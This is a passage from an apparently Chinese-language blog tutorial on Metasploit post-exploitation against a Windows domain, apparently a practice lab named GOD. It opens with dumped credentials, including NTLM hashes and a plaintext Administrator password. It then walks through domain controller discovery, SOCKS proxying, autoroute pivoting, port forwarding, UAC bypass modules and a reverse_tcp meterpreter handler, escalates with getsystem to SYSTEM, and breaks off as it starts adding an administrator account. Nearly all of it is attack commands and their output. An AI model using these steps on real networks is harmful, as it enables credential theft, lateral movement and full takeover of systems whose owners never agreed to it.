S-1-5-21-2952760202-1353902439-2381784089-500</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * LM       : 3333deaae325ebb705026d3fb1a43796</span><br><span class="line"> * NTLM     : 7d0e302e0cbd94d9353ac4a51d7c39c1</span><br><span class="line"> * SHA1     : d4f206f0d8303230185b2ff2fedb7d40a62effa5</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : 1999118gxaGXA.</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : 1999118gxaGXA.</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD.ORG</span><br><span class="line"> * Password : 1999118gxaGXA.</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><h5 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_domain  #查找域控</span><br><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_domain</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: god</span><br><span class="line">[+] FOUND Domain Controller: owa (IP: 192.168.52.138)</span><br></pre></td></tr></table></figure><h5 id="ifconfig查看DNS服务器地址"><a href="#ifconfig查看DNS服务器地址" class="headerlink" title="ifconfig查看DNS服务器地址"></a>ifconfig查看DNS服务器地址</h5><h4 id="代理与端口设置"><a href="#代理与端口设置" class="headerlink" title="代理与端口设置"></a>代理与端口设置</h4><h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br></pre></td></tr></table></figure><h5 id="设置sockets5代理"><a href="#设置sockets5代理" class="headerlink" title="设置sockets5代理"></a>设置sockets5代理</h5><p>搜索一下可用代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search socks</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                     Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                     ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary&#x2F;scanner&#x2F;http&#x2F;sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal</span><br><span class="line">   1  auxiliary&#x2F;server&#x2F;socks4a                                  normal  No     Socks4a Proxy Server</span><br><span class="line">   2  auxiliary&#x2F;server&#x2F;socks5                                   normal  No     Socks5 Proxy Server</span><br><span class="line">   3  auxiliary&#x2F;server&#x2F;socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection</span><br></pre></td></tr></table></figure><p>设置代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary&#x2F;server&#x2F;socks5</span><br><span class="line">msf5 auxiliary(server&#x2F;socks5) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary&#x2F;server&#x2F;socks5):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password for SOCKS5 listener</span><br><span class="line">   SRVHOST   0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username for SOCKS5 listener</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server&#x2F;socks5) &gt; set SRVHOST 127.0.0.1</span><br><span class="line">SRVHOST &#x3D;&gt; 127.0.0.1</span><br><span class="line">msf5 auxiliary(server&#x2F;socks5) &gt; set SRVPORT 5555</span><br><span class="line">SRVPORT &#x3D;&gt; 5555</span><br><span class="line">msf5 auxiliary(server&#x2F;socks5) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line">msf5 auxiliary(server&#x2F;socks5) &gt;</span><br><span class="line">[*] Starting the socks5 proxy server</span><br></pre></td></tr></table></figure><p>然后也可以直接使用一下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set proxies socks5:127.0.0.1:8990  设置代理</span><br><span class="line">setg ReverseAllowProxy true 允许反向代理</span><br></pre></td></tr></table></figure><p>获取内网网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">Local subnet: 169.254.0.0&#x2F;255.255.0.0</span><br><span class="line">Local subnet: 172.20.10.0&#x2F;255.255.255.240</span><br><span class="line">Local subnet: 192.168.52.0&#x2F;255.255.255.0</span><br></pre></td></tr></table></figure><p>添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 198.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure><p>查看是否添加成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   198.168.52.0       255.255.255.0      Session 1</span><br></pre></td></tr></table></figure><p>ARP扫描内网主机</p><h5 id="添加去往”内网网段”的路由"><a href="#添加去往”内网网段”的路由" class="headerlink" title="添加去往”内网网段”的路由"></a>添加去往”内网网段”的路由</h5><ul><li><p>MSF 路由添加帮助查询命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1&#x2F;255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1&#x2F;24              # CIDR notation is also okay</span><br><span class="line">[*]   run autoroute -p                            # Print active routing table</span><br><span class="line">[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1&#x2F;255.255.255.0 route</span><br><span class="line">[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post&#x2F;multi&#x2F;manage&#x2F;autoroute module</span><br></pre></td></tr></table></figure></li><li><p>获取目标内网地址段 </p><p>具体获取被攻击目标内网地址网段的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">Local subnet: 172.17.0.0&#x2F;255.255.0.0</span><br></pre></td></tr></table></figure><p>由上可以获知，目标内网网段是“172.17.0.0./24”</p></li><li><p>添加去往目标网段的转发路由 </p><p>在meterpreter 会话上直接添加去往目标网段的路由，具体添加方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 172.17.0.0&#x2F;24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">[*] Adding a route to 172.17.0.0&#x2F;255.255.255.0...</span><br><span class="line">[+] Added route to 172.17.0.0&#x2F;255.255.255.0 via 10.48.8.234</span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure></li><li><p>添加网路由后，我们来查看下路由的添加情况如何</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   172.17.0.0         255.255.255.0      Session 3</span><br></pre></td></tr></table></figure></li></ul><p>将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。</p><ul><li><p>删除路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 172.20.10.0</span><br></pre></td></tr></table></figure></li></ul><h4 id="autoroute模块"><a href="#autoroute模块" class="headerlink" title="autoroute模块"></a>autoroute模块</h4><h5 id="获取当前机器的所有网段信息"><a href="#获取当前机器的所有网段信息" class="headerlink" title="获取当前机器的所有网段信息"></a>获取当前机器的所有网段信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">Local subnet: 10.10.10.0&#x2F;255.255.255.0</span><br><span class="line">Local subnet: 172.20.10.0&#x2F;255.255.255.240</span><br></pre></td></tr></table></figure><h5 id="添加目标内网网段的路由"><a href="#添加目标内网网段的路由" class="headerlink" title="添加目标内网网段的路由"></a>添加目标内网网段的路由</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 10.10.10.0&#x2F;24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">[*] Adding a route to 10.10.10.0&#x2F;255.255.255.0...</span><br><span class="line">[+] Added route to 10.10.10.0&#x2F;255.255.255.0 via 172.20.10.13</span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure><h5 id="打印当前添加的路由表信息"><a href="#打印当前添加的路由表信息" class="headerlink" title="打印当前添加的路由表信息"></a>打印当前添加的路由表信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   10.10.10.0         255.255.255.0      Session 4</span><br></pre></td></tr></table></figure><p>删除指定的路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 10.10.10.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h4><p>进去内网之后，我们使用相关模块进行主机发现。</p><h5 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; show options</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 10</span><br><span class="line">threads &#x3D;&gt; 10</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set RHOSTS 172.18.0.2-100</span><br><span class="line">RHOSTS &#x3D;&gt; 172.18.0.2-100</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set PORTS 3306,8022</span><br><span class="line">PORTS &#x3D;&gt; 3306,8022</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 172.18.0.3:           - 172.18.0.3:3306 - TCP OPEN</span><br><span class="line">[+] 172.18.0.2:           - 172.18.0.2:8022 - TCP OPEN</span><br><span class="line">[*] 172.18.0.2-100:       - Scanned 10 of 99 hosts (10% complete)</span><br></pre></td></tr></table></figure><h5 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a>ARP扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;arp_scanner</span><br></pre></td></tr></table></figure><h4 id="Metasploit-Portfwd（端口转发-重定向）"><a href="#Metasploit-Portfwd（端口转发-重定向）" class="headerlink" title="Metasploit Portfwd（端口转发/重定向）"></a>Metasploit Portfwd（端口转发/重定向）</h4><p>在活动的Meterpreter会话中，键入<strong>portfwd -h</strong>将显示命令的各种选项和参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">     -L &gt;opt&gt;  要监听的本地主机（可选）。</span><br><span class="line">     -h        帮助横幅。</span><br><span class="line">     -l &gt;opt&gt;  要监听的本地端口。</span><br><span class="line">     -p &gt;opt&gt;  要连接的远程端口</span><br><span class="line">     -r &gt;opt&gt;  要连接的远程主机</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>Options：选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。</span><br><span class="line"></span><br><span class="line">-h：显示以上信息。</span><br><span class="line"></span><br><span class="line">-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。</span><br><span class="line"></span><br><span class="line">-p：TCP连接将转发到的端口。</span><br><span class="line"></span><br><span class="line">-r：连接被中继到的IP地址（目标）。</span><br></pre></td></tr></table></figure><p> Arguments：参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add：该参数用于创建转发。</span><br><span class="line"></span><br><span class="line">Delete：这将从我们的转发端口列表中删除先前的条目。</span><br><span class="line"></span><br><span class="line">List：这将列出当前转发的所有端口。</span><br><span class="line"></span><br><span class="line">Flush：这将删除我们的转发列表中的所有端口。</span><br></pre></td></tr></table></figure><p>例子：</p><p>Add参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r  [target host]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。</span><br><span class="line">-l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。</span><br><span class="line">-p 3389是我们的定向主机上的目标端口。</span><br><span class="line">-r [target host]是我们的目标系统的IP或主机名。</span><br></pre></td></tr></table></figure><p>List参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd list</span><br><span class="line">0: 0.0.0.0:3389 -&gt; 172.16.194.191:3389</span><br><span class="line">1: 0.0.0.0:1337 -&gt; 172.16.194.191:1337</span><br><span class="line">2: 0.0.0.0:2222 -&gt; 172.16.194.191:2222</span><br><span class="line">3 total local port forwards.</span><br></pre></td></tr></table></figure><h4 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h4><ul><li><p>绕过UAC</p><p>bypassuac</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">或者</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;set target 1</span><br><span class="line">set target  1         #设置目标系统类型，1是64位，0是32位</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac  #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection  #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。</span><br></pre></td></tr></table></figure><p>RunAs绕过</p><p>创建一个可执行文件，目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="Windows渗透"><a href="#Windows渗透" class="headerlink" title="Windows渗透"></a>Windows渗透</h4><h5 id="cmd与3389"><a href="#cmd与3389" class="headerlink" title="cmd与3389"></a>cmd与3389</h5><ul><li>监听木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; chcp 65001</span><br><span class="line">[-] Unknown command: chcp.</span><br><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 172.20.10.3</span><br><span class="line">LHOST &#x3D;&gt; 172.20.10.3</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 1234</span><br><span class="line">LPORT &#x3D;&gt; 1234</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.20.10.3:1234</span><br><span class="line">[*] Sending stage (176195 bytes) to 172.20.10.6</span><br><span class="line">[*] Meterpreter session 1 opened (172.20.10.3:1234 -&gt; 172.20.10.6:6198) at 2020-09-05 12:31:20 +0800</span><br></pre></td></tr></table></figure><ul><li>获取当前权限以及提权</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: GOD\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>切换cmdshell，注意切换之后cmdshell与msf的会话具有相同的权限</p><ul><li>添加用户并加入管理员组</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 